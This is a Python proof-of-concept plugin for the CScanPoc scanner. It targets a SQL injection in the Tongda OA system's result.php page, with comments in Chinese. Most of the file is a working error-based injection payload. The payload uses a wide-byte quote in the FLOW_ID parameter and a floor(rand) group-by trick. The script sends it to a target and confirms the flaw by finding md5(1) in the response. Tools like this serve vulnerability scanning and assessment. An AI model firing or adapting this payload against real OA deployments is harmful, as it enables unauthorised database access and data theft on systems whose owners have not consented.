# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'TongdaOA_0001'  # 平台漏洞编号，留空
    name = '通达OA系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-05-27'  # 漏洞公布时间
    desc = '''
        通达OA系统代表了协同OA的先进理念,16年研发铸就成熟OA产品。
        通达OA系统/general/score/flow/scoredate/result.php页面参数过滤不严谨，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0116359'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '通达OA系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e23a62db-3243-4258-80f0-60719a6e070d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer http://www.wooyun.org/bugs/wooyun-2015-0116359
            payload = '/general/score/flow/scoredate/result.php?FLOW_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1)),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23'
            verify_url = self.target + payload
            req = requests.get(verify_url)

            if req.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
